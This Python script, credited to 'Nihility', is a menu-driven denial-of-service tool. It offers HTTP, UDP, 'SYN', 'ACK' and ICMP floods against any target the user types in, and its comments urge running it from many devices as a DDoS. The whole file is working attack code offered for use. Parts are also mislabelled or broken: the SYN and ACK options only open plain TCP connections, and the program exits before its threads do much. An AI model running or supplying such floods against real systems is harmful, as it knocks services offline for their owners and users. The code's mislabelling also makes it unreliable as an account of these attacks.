import os
from secrets import choice
from socket import socket
import socket
import time
import threading
import requests

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"
BLUE = "\033[34m"
# dos script(can be a ddos script though, just use it with multiple devices)
# No need to skid this, it's a simple dos script. If you want to use it, use it.
# Credit me for the script, but you can edit it and make it your own if you want. Just give me credit for the original code.
print(f"""{RED}
( [] )  ( [] )
      <>
[HHHHHHHHHHH]
      {RESET}""")
time.sleep(1)
print(f"{YELLOW}\n Version: 1.0\n Coded by Nihility.\n You fookin drugga.\n\n\nNOTE: Use this script with multiple devices to increase the attack power. Some options may require root.{RESET}")
print(f"{GREEN}1.HTTP Flood.(web dos)\n2.UDP Flood.(network dos)\n3.SYN Flood.(tcp dos)\n4.ACK Flood.(tcp dos)\n5.ICMP Flood.(network dos){RESET}")
choice = input(f"{BLUE}Choose an option: {RESET}")
if choice == "1":
    target_url = input(f"{BLUE}Enter the target URL: {RESET}")
    def http_flood():
        while True:
            try:
                response = requests.get(target_url)
                print(f"{GREEN}Sent HTTP request to {target_url} with status code {response.status_code}{RESET}", threading.current_thread().name, time.time())
            except Exception as e:
                print(f"{RED}Error sending HTTP request: {e}{RESET}")
    for _ in range(10):
        thread = threading.Thread(target=http_flood)
        thread.daemon = True
        thread.start()
elif choice == "2":
    target_input = input(f"{BLUE}Enter the target hostname or IP address: {RESET}")
    try:
        target_ip = socket.gethostbyname(target_input)
    except socket.gaierror:
        print("Invalid hostname or IP address.")
        exit(1)
    target_port = int(input("Enter the target port: "))
    def udp_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(os.urandom(1024), (target_ip, target_port))
                print(f"{GREEN}Sent UDP packet to {target_ip}:{target_port} from thread {threading.current_thread().name} at {time.time()} (packet_size=1024){RESET}")
            except Exception as e:
                print(f"Error sending UDP packet: {e}")
    for _ in range(10):
        threading.Thread(target=udp_flood, daemon=True).start()
elif choice == "3":
    print("SYN Flood attack")
    syn_target = input(f"{BLUE}Enter the target IP address: {RESET}")
    syn_port = int(input(f"{BLUE}Enter the target port: {RESET}"))
    def syn_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((syn_target, syn_port))
                print(f"{GREEN}Sent SYN packet to {syn_target}:{syn_port} from thread {threading.current_thread().name} at {time.time()}{RESET}")
            except Exception as e:
                print(f"{RED}Error sending SYN packet: {e}{RESET}")
    for _ in range(10):
        threading.Thread(target=syn_flood, daemon=True).start()
elif choice == "4":
    print("ACK Flood attack")
    ack_target = input(f"{BLUE}Enter the target IP address: {RESET}")
    ack_port = int(input(f"{BLUE}Enter the target port: {RESET}"))
    def ack_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ack_target, ack_port))
                print(f"{GREEN}Sent ACK packet to {ack_target}:{ack_port} from thread {threading.current_thread().name} at {time.time()}{RESET}")
            except Exception as e:
                print(f"{RED}Error sending ACK packet: {e}{RESET}")
    for _ in range(10):
        threading.Thread(target=ack_flood, daemon=True).start()
elif choice == "5":
    print("ICMP Flood attack")
    icmp_target = input(f"{BLUE}Enter the target IP address: {RESET}")
    def icmp_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(os.urandom(1024), (icmp_target, 0))
                print(f"{GREEN}Sent ICMP packet to {icmp_target} from thread {threading.current_thread().name} at {time.time()} (packet_size=1024){RESET}")
            except Exception as e:
                print(f"{RED}Error sending ICMP packet: {e}{RESET}")
    for _ in range(10):
        threading.Thread(target=icmp_flood, daemon=True).start()
